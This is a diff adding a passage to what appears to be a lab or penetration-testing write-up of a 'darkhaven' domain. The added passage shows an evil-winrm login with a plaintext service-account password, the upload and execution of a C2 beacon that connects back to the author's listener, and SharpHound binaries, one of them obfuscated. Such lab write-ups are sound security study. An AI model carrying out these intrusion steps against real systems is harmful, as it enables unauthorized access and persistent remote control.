@@ -225,3 +225,39 @@ They also have acces via winrm
 This means i can now generate a beacon for my web listener and upload it via winrm to get a C2 session
 
 ![496](Pasted%20image%2020260419162933.png)
+
+Ive generated the agent now ill upload it and execute it!
+
+```python
+evil-winrm -i web.ext.darkhaven.local -u svc_webpool -p 'D@rkH@v3n128!'
+                                        
+Evil-WinRM shell v3.9
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\svc_webpool\Documents> upload web-agent.x64.exe
+                                        
+Info: Uploading /home/kali/hsm/darkhaven/web-agent.x64.exe to C:\Users\svc_webpool\Documents\web-agent.x64.exe
+                                        
+Data: 120148 bytes of 120148 bytes copied
+                                        
+Info: Upload successful!
+*Evil-WinRM* PS C:\Users\svc_webpool\Documents> dir
+
+
+    Directory: C:\Users\svc_webpool\Documents
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----          4/8/2026   6:39 PM         734720 obf_sharphound.exe
+-a----          4/8/2026   6:36 PM        1351680 sharphound.exe
+-a----         4/19/2026   3:30 PM          90112 web-agent.x64.exe
+
+
+*Evil-WinRM* PS C:\Users\svc_webpool\Documents> .\web-agent.x64.exe
+*Evil-WinRM* PS C:\Users\svc_webpool\Documents> 
+```
